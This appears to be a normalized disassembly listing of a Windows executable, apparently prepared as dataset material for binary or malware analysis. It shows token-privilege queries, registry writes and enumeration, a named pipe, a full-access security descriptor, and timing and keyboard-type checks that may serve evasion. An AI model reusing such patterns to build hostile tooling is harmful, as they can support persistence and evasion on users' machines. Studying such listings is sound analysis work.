jmp r-xdata
dec eax
jns r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + eax * 4 ]
movzx ecx [ ecx + 0x35 ]
cmp ecx [ esp + 0xc ]
jne r-xdata
call sub_4046cc
push esi
call sub_405cf1
inc edi
sub_40653c
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
call sub_403925
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edi [ rw-data ]
sar eax 0x2
dec eax
mov [ ebp - 0x24 ] eax
inc eax
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
xor al al
cmp esi ecx
jne r-xdata
cmp esi ecx
je r-xdata
dec [ ebp - 0x4 ]
sub ebx 0x4
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx ] ecx
mov [ ebx ] esi
mov dl [ esi + 0x35 ]
mov al [ ecx + 0x35 ]
cmp dl al
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
cmp eax [ ebp - 0x24 ]
jle r-xdata
test al al
jne r-xdata
setb al
jmp r-xdata
mov edi [ ebp - 0x1c ]
mov edx edi
sub edx [ esi + 0x30 ]
sub edi [ ecx + 0x30 ]
cmp edx edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebx ]
lea edx [ edi + eax * 4 ]
mov esi [ edx ]
mov [ ebp - 0x20 ] edx
mov al 0x1
test esi esi
je r-xdata
test al al
je r-xdata
setb al
mov eax [ esi + 0x28 ]
cmp eax [ ecx + 0x28 ]
seta al
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] eax
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
sar eax 0x2
xor ecx ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x18 ]
jmp r-xdata
cmp [ edi + ecx * 4 ] 0x0
je r-xdata
mov eax ecx
shl eax 0x2
mov [ rw-data ] eax
inc ecx
cmp ecx eax
jl r-xdata
jmp r-xdata
sub_406650
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
mov edi [ eax + 0x4 ]
shr edi 0x2
xor ebx ebx
test edi edi
jle r-xdata
mov esi [ esp + 0x14 ]
call sub_405f3e
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov esi [ Sleep@IAT ]
push 0xa
call esi
push 0x0
call esi
mov eax [ esp + 0x14 ]
mov ebp [ eax ]
call sub_4046cc
push [ ebp + ebx * 4 ]
call sub_405c44
inc ebx
cmp ebx edi
jl r-xdata
sub_40669b
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
call [ InternetGetConnectedState@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x5968 ] ecx
test eax eax
je r-xdata
xor al al
leave
retn
test cl 0x20
jne r-xdata
mov edx ecx
shr edx 0x2
mov al 0x1
and dl al
mov [ esi + 0x5964 ] dl
leave
retn
sub_4066e2
mov eax sub_41d83b
call sub_4198ec
sub esp 0x11c
cmp [ esi + 0x595c ] 0xffffffff
push ebx
push edi
jne r-xdata
mov eax [ esi + 0x595c ]
xor ebx ebx
inc ebx
mov edi rw-data
test [ rw-data ] bl
jne r-xdata
push edi
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] ebx
and [ esi + 0x595c ] 0x0
mov ecx 0x11c
mov edx ecx
lea eax [ ebp - 0x128 ]
or [ rw-data ] ebx
and [ ebp - 0x4 ] 0x0
push edi
call [ InitializeCriticalSection@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
lea eax [ ebp - 0x128 ]
push eax
mov [ ebp - 0x128 ] ecx
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x118 ] ebx
jbe r-xdata
lea eax [ ebp - 0x128 ]
push eax
mov [ ebp - 0x128 ] 0x114
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
and [ esi + 0x595c ] 0x0
push 0x2
pop eax
cmp [ ebp - 0x118 ] eax
jne r-xdata
and [ esi + 0x595c ] eax
or [ ebp - 0x4 ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
cmp [ ebp - 0x124 ] 0x6
jbe r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
jne r-xdata
mov [ esi + 0x595c ] 0x5
jmp r-xdata
cmp [ ebp - 0x124 ] 0x5
jne r-xdata
cmp [ ebp - 0x120 ] eax
jb r-xdata
cmp [ ebp - 0x120 ] eax
jne r-xdata
cmp [ ebp - 0x120 ] ebx
je r-xdata
mov [ esi + 0x595c ] 0x7
jmp r-xdata
cmp [ ebp - 0x120 ] ebx
je r-xdata
mov [ esi + 0x595c ] eax
jmp r-xdata
cmp [ ebp - 0x120 ] 0x0
jne r-xdata
cmp [ ebp - 0x120 ] 0x0
jne r-xdata
mov [ esi + 0x595c ] 0x3
jmp r-xdata
mov [ esi + 0x595c ] ebx
jmp r-xdata
sub_406850
push ebp
mov ebp esp
push ecx
push ebx
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
xor ebx ebx
push 0x8
mov [ ebp - 0x4 ] ebx
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
mov edi [ GetLastError@IAT ]
test eax eax
jne r-xdata
push esi
push [ esi ]
push [ ebp + 0x8 ]
push 0x1
push [ ebp - 0x4 ]
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
call edi
cmp eax 0x3f0
je r-xdata
mov bl 0x1
jmp r-xdata
call edi
cmp eax 0x7a
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
xor al al
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov al bl
jmp r-xdata
pop edi
pop ebx
leave
retn 0x4
sub_4068cf
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
xor esi esi
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0xc ] 0x3
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push ebx
mov ebx [ RegQueryValueExW@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call ebx
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jb r-xdata
push [ ebp - 0x4 ]
jmp r-xdata
pop esi
leave
retn 0x10
push [ ebp - 0x4 ]
mov [ edi ] eax
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x14 ] esi
sete al
cmp [ ebp + 0x14 ] esi
je r-xdata
mov [ edi ] esi
call [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x14 ]
lea eax [ ebp - 0xc ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call ebx
push [ ebp - 0x4 ]
test eax eax
je r-xdata
pop ebx
mov eax [ ebp - 0x8 ]
mov [ edi ] eax
call [ RegCloseKey@IAT ]
mov al 0x1
jmp r-xdata
sub_40697b
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp + 0xc ]
push eax
xor esi esi
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x20006
push esi
push esi
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] esi
je r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x4 ]
cmp [ ebp + 0x1c ] esi
je r-xdata
pop esi
leave
retn 0x18
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call [ RegSetValueExW@IAT ]
push [ ebp - 0x4 ]
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
mov al 0x1
call [ RegCloseKey@IAT ]
jmp r-xdata
sub_4069e9
push ebp
mov ebp esp
sub esp 0x424
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] edx
push edx
mov [ ebp - 0x14 ] ecx
call [ RegOpenKeyW@IAT ]
test eax eax
jne r-xdata
xor al al
push ebx
push esi
xor ebx ebx
push edi
mov esi 0x104
cmp [ ebp + 0x10 ] bl
je r-xdata
cmp [ ebp + 0xc ] bl
je r-xdata
mov edi [ RegEnumValueW@IAT ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x424 ]
push eax
mov [ ebp - 0x8 ] ebx
push ebx
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop esi
mov al 0x1
pop ebx
jmp r-xdata
mov edi [ RegEnumKeyW@IAT ]
push esi
lea eax [ ebp - 0x424 ]
push eax
mov [ ebp - 0x8 ] ebx
push ebx
jmp r-xdata
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
call edi
test eax eax
je r-xdata
leave
retn 0x14
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x424 ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push 0x208
push [ ebp + 0x8 ]
lea eax [ ebp - 0x21c ]
push eax
call [ lstrcpynW@IAT ]
lea eax [ ebp - 0x21c ]
push eax
call [ lstrlenW@IAT ]
cmp eax 0x102
jae r-xdata
inc [ ebp - 0x8 ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x424 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x21c ]
push [ ebp + 0x18 ]
push ebx
push eax
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push r--data
lea eax [ ebp - 0x21c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x424 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ lstrcatW@IAT ]
push [ ebp + 0x18 ]
mov edx [ ebp - 0x10 ]
push [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x21c ]
push [ ebp + 0xc ]
push eax
call sub_4069e9
inc [ ebp - 0x8 ]
push esi
lea eax [ ebp - 0x424 ]
push eax
push [ ebp - 0x8 ]
sub_406b4c
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi eax
mov [ esi ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] ebx
call sub_407000
mov eax [ ebp + 0x8 ]
mov [ esi + 0x38 ] eax
xor eax eax
xor ecx ecx
add eax [ ebp + 0xc ]
mov [ esi + 0x258 ] bl
mov [ esi + 0x40 ] eax
lea eax [ esi + 0x4c ]
push eax
push 0x1
push ebx
adc edi ecx
push 0x2e
mov [ esi + 0x44 ] edi
mov edi [ SHGetFolderPathW@IAT ]
push ebx
mov [ esi + 0x48 ] ebx
call edi
test eax eax
je r-xdata
mov edi [ lstrcatW@IAT ]
inc [ esi + 0x48 ]
push r--data
lea eax [ esi + 0x4c ]
push eax
call edi
push r--data
lea ebx [ esi + 0x4c ]
push ebx
call edi
push [ esi + 0x44 ]
lea eax [ ebp - 0x20 ]
push [ esi + 0x40 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x20 ]
push eax
push ebx
call edi
mov eax [ esi + 0x40 ]
mov edx [ esi + 0x44 ]
mov cl 0x20
call sub_419400
push edx
push eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x20 ]
push eax
push ebx
call edi
push r--data
push ebx
call edi
lea eax [ esi + 0x4c ]
push eax
push 0x1
push ebx
push 0x23
push ebx
call edi
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
push eax
push 0x1
push ebx
push 0x2d
push ebx
call edi
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
push eax
push 0x208
call [ GetTempPathW@IAT ]
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x8
sub_406c46
push esi
mov esi [ LocalFree@IAT ]
push edi
mov edi eax
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
push eax
call esi
call sub_406db6
pop edi
pop esi
retn
push eax
call [ FreeSid@IAT ]
sub_406c79
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x20
cmp [ esi + 0x258 ] 0x0
push ebx
push edi
jne r-xdata
mov al 0x1
mov ebx [ lstrcatW@IAT ]
lea ecx [ esi + 0x4 ]
push ecx
push eax
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x20
je r-xdata
mov [ esi + 0x258 ] 0x1
jmp r-xdata
push eax
push 0x10000000
push edi
call [ CreateFileW@IAT ]
mov [ esi + 0x254 ] eax
cmp eax 0xffffffff
je r-xdata
xor al al
jmp r-xdata
mov eax [ esi + 0x48 ]
xor ecx ecx
sub eax ecx
je r-xdata
cmp [ esi + 0x258 ] 0x0
je r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push edi
push 0x1
push ecx
push 0x2e
push ecx
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
xor eax eax
push eax
push 0x2
lea edi [ esi + 0x4c ]
push 0x4
cmp [ esi ] eax
jne r-xdata
inc [ esi + 0x48 ]
push r--data
push edi
call ebx
push r--data
push edi
call ebx
push [ esi + 0x44 ]
lea eax [ esp + 0xc ]
push [ esi + 0x40 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ esp + 0x8 ]
push eax
push edi
call ebx
mov eax [ esi + 0x40 ]
mov edx [ esi + 0x44 ]
mov cl 0x20
call sub_419400
push edx
push eax
lea eax [ esp + 0x10 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ esp + 0x8 ]
push eax
push edi
call ebx
push r--data
push edi
call ebx
xor ecx ecx
push edi
push 0x1
push ecx
push 0x23
push ecx
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
xor ecx ecx
push edi
push 0x1
push ecx
push 0x2d
push ecx
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
push edi
push 0x208
call [ GetTempPathW@IAT ]
test eax eax
je r-xdata
sub_406db6
cmp [ edi + 0x258 ] 0x0
je r-xdata
mov [ edi + 0x258 ] 0x0
mov al 0x1
retn
mov eax [ edi + 0x254 ]
push esi
cmp eax 0xffffffff
je r-xdata
pop esi
push eax
call [ CloseHandle@IAT ]
and [ edi + 0x254 ] 0x0
sub_406de4
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push ebx
push esi
mov esi eax
mov al [ esi + 0x258 ]
push edi
or ebx 0xffffffff
mov [ ebp - 0x1 ] al
call sub_406c79
test al al
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
push 0x2
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push [ esi + 0x254 ]
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
or ebx 0xffffffff
cmp ebx 0x4
ja r-xdata
mov edi esi
call sub_406db6
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
sub_406e3e
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dc6f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
or [ esp + 0x8 ] 0xffffffff
push ebx
push esi
push edi
mov edi edx
lea esi [ esp + 0x20 ]
mov ebx ecx
call sub_405df1
xor edi edi
mov [ esp + 0x3c ] edi
mov al [ ebx + 0x258 ]
mov esi ebx
mov [ esp + 0x13 ] al
call sub_406c79
test al al
je r-xdata
mov eax [ esp + 0x24 ]
cmp [ esp + 0x14 ] eax
sete bl
or [ esp + 0x3c ] 0xffffffff
lea esi [ esp + 0x20 ]
call sub_405f2c
mov ecx [ esp + 0x34 ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea eax [ esp + 0x1c ]
push eax
push edi
push [ ebx + 0x254 ]
mov [ esp + 0x28 ] edi
call [ SetFilePointer@IAT ]
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
push 0x4
pop edi
lea eax [ esp + 0x24 ]
call sub_406173
cmp [ esp + 0x20 ] 0x0
je r-xdata
push 0x0
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x2c ]
push [ esp + 0x2c ]
push [ ebx + 0x254 ]
call [ WriteFile@IAT ]
cmp [ esp + 0x13 ] 0x0
jne r-xdata
push [ esp + 0x24 ]
push [ esp + 0x24 ]
call sub_401923
mov edi ebx
call sub_406db6
sub_406f26
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0x10 ] 0x0
push esi
push edi
mov edi eax
mov al [ ebx + 0x258 ]
mov esi ebx
mov [ ebp - 0x1 ] al
call sub_406c79
test al al
je r-xdata
xor al al
mov eax ebx
call sub_406de4
mov esi edi
mov [ ebp - 0x8 ] eax
call sub_405f3e
xor esi esi
cmp [ ebp - 0x8 ] esi
jbe r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jle r-xdata
mov al 0x1
jmp r-xdata
mov edi ebx
call sub_406db6
push esi
lea eax [ ebp - 0xc ]
push eax
push esi
push [ ebx + 0x254 ]
mov [ ebp - 0xc ] esi
call [ SetFilePointer@IAT ]
push esi
lea eax [ ebp - 0x10 ]
push eax
push [ edi + 0x4 ]
push [ edi ]
push [ ebx + 0x254 ]
call [ ReadFile@IAT ]
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
cmp eax esi
je r-xdata
push 0x1
push [ ebp - 0x8 ]
mov esi edi
call sub_405f9d
xor esi esi
pop edi
pop esi
leave
retn
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
mov esi [ eax ]
cmp ecx 0x4
jl r-xdata
cmp ecx 0x1
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx esi
cmp ecx eax
jg r-xdata
add ecx 0xfffffffc
push ecx
lea ecx [ eax + 0x4 ]
push ecx
push eax
call sub_412d60
add esp 0xc
add [ edi + 0x4 ] 0xfffffffc
push ecx
push eax
call sub_401923
sub eax ecx
mov [ edi + 0x4 ] eax
sub_407000
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
xor ebx ebx
lea edi [ esi + 0x30 ]
push edi
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x1
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x100
call [ AllocateAndInitializeSid@IAT ]
cmp [ edi ] ebx
je r-xdata
xor al al
push 0x20
lea eax [ esi + 0x10 ]
pop edx
mov ecx eax
mov [ ecx ] bl
inc ecx
dec edx
jne r-xdata
mov ecx [ edi ]
push 0xc
mov [ esi + 0x2c ] ecx
mov [ eax ] 0x1fffff
mov [ esi + 0x14 ] 0x2
mov [ esi + 0x18 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] 0x5
pop edx
lea ecx [ esi + 0x4 ]
mov [ ecx ] bl
inc ecx
dec edx
jne r-xdata
lea ecx [ esi + 0x34 ]
push ecx
push ebx
push eax
push 0x1
call [ SetEntriesInAclW@IAT ]
test eax eax
jne r-xdata
push 0x14
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi ] eax
cmp eax ebx
je r-xdata
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push ebx
push [ esi + 0x34 ]
push 0x1
push [ esi ]
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
mov eax [ esi ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] 0xc
mov [ esi + 0xc ] ebx
mov al 0x1
jmp r-xdata
pop edi
pop ebx
leave
retn
sub_4070c5
push ebp
mov ebp esp
sub esp 0x414
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x414 ]
push eax
mov [ ebp - 0x4 ] 0x104
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x414 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ SetLastError@IAT ]
push 0x0
push 0x64
push 0x64
push 0x64
push 0x1
push 0x4
push 0x80003
lea eax [ ebp - 0x20c ]
push eax
call [ CreateNamedPipeW@IAT ]
mov [ rw-data ] eax
call [ GetLastError@IAT ]
cmp [ rw-data ] 0xffffffff
je r-xdata
mov al 0x1
leave
retn
xor al al
leave
retn
test eax eax
je r-xdata
sub_407156
mov eax sub_41d952
call sub_4198ec
sub esp 0x20
push ebx
push esi
push edi
mov edi rw-data
push edi
mov [ ebp - 0x18 ] edi
call sub_401108
and [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x28 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x1
call sub_4015d2
call sub_4046cc
mov ebx rw-data
mov eax 0x4b5
mov ecx ebx
call sub_4017b9
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
call sub_4046cc
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push 0x1
push eax
call sub_405f9d
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x28 ]
call sub_405f2c
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ ebp - 0x14 ] 0x1
jbe r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x28 ]
mov eax 0x4b5
mov edx ebx
call sub_405b60
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x28 ]
mov ebx edi
call sub_4013ef
sub_407203
mov eax sub_41d937
call sub_4198ec
sub esp 0x18
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] ebx
push [ ebp + 0xc ]
call sub_401108
mov [ ebp - 0x4 ] ebx
xor edi edi
inc edi
lea esi [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edi
call sub_405d11
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x14 ]
mov edi [ eax ]
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
mov [ ebp + 0x14 ] eax
call sub_405f3e
mov esi [ ebp + 0x8 ]
push edi
push 0x8
lea eax [ ebp + 0x14 ]
push eax
mov ecx esi
call sub_40151f
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] bl
lea esi [ ebp - 0x24 ]
call sub_405f2c
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
mov edx [ eax + 0x9 ]
add edx [ esi + 0x14 ]
mov eax [ eax + 0x5 ]
push ebx
push edx
lea ecx [ ebp - 0x24 ]
call sub_4060be
mov ebx [ ebp + 0xc ]
lea eax [ ebp - 0x24 ]
call sub_4013ef
xor ebx ebx
sub_40729d
mov eax sub_41da1b
call sub_4198ec
push ecx
test [ rw-data ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
leave
retn
or [ rw-data ] 0x1
and [ ebp - 0x4 ] 0x0
call sub_407156
push sub_41eb16
call sub_413278
pop ecx
or [ ebp - 0x4 ] 0xffffffff
sub_4072e1
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x13ec
call sub_419050
push ebx
push esi
push edi
lea eax [ esp + 0x44 ]
push eax
call [ GetCommandLineW@IAT ]
push eax
call [ CommandLineToArgvW@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ LocalFree@IAT ]
mov edi [ Sleep@IAT ]
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] 0xfa
mov eax [ esp + 0x44 ]
cmp eax 0x2
jle r-xdata
push 0x0
call edi
mov eax [ esp + 0x1c ]
mov al [ eax ]
mov cl [ esp + 0x2c ]
add [ esp + 0x2c ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x1c ]
inc esi
cmp [ esp + 0x2c ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x14 ]
jne r-xdata
add eax 0xfffffffe
push eax
call sub_4046cc
push eax
lea eax [ esi + 0x8 ]
call sub_40356a
test al al
je r-xdata
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x13 ] 0x0
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x74 ]
push eax
mov [ esi + 0x2 ] 0x0
mov [ esp + 0x28 ] 0x200
call [ GetUserNameW@IAT ]
call [ GetCommandLineW@IAT ]
xor ecx ecx
push 0x0
call [ ExitProcess@IAT ]
cmp [ eax + edx * 2 ] 0x0
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
lea eax [ esp + 0x50 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x48 ]
push eax
lea eax [ esp + 0x54 ]
push eax
call [ SystemTimeToFileTime@IAT ]
mov esi [ GetVersionExW@IAT ]
lea eax [ esp + 0x70 ]
push eax
call esi
call sub_403925
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x70 ]
push eax
call esi
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x14 ] 0xfa
add ecx 0xa
cmp ecx 0xc8
jl r-xdata
push 0x0
call edi
mov eax [ esp + 0x30 ]
mov al [ eax ]
mov cl [ esp + 0x1c ]
add [ esp + 0x1c ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x30 ]
inc esi
cmp [ esp + 0x1c ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x14 ]
jne r-xdata
mov edx ecx
and edx 0x80000001
jns r-xdata
mov [ esp + 0x1c ] 0x2
mov [ esp + 0x13 ] 0x0
mov [ esi + 0x2 ] 0x0
mov [ esp + 0x14 ] 0x1
call sub_403925
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
inc esi
cmp esi 0x8
jle r-xdata
push 0x0
call [ GetKeyboardType@IAT ]
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] 0xfa
fild [ esp + 0x14 ]
xor esi esi
inc esi
mov [ esp + 0x18 ] esi
fdiv [ r--data ]
fsub [ r--data ]
fmul [ r--data ]
fstp [ esp + 0x48 ]
jmp r-xdata
push 0x1
call edi
push 0x0
call edi
call sub_403925
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
push 0x0
call edi
mov eax [ esp + 0x18 ]
mov al [ eax ]
mov cl [ esp + 0x14 ]
add [ esp + 0x14 ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x18 ]
inc esi
cmp [ esp + 0x14 ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x20 ]
jne r-xdata
fild [ esp + 0x18 ]
push esi
fdiv [ r--data ]
fsub [ r--data ]
fmul [ r--data ]
fsub [ r--data ]
fstp [ esp + 0x34 ]
call edi
push 0x0
call edi
fldz
fst [ esp + 0x38 ]
mov [ esp + 0x1c ] esi
fstp [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x13 ] 0x0
mov [ esi + 0x2 ] 0x0
call sub_4046cc
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x5804 ] ecx
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] 0xfa
call sub_403925
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
fld [ esp + 0x38 ]
fmul [ esp + 0x38 ]
fld [ esp + 0x20 ]
fmul [ esp + 0x20 ]
fsubp st1
fadd [ esp + 0x30 ]
fld [ esp + 0x38 ]
fadd st0
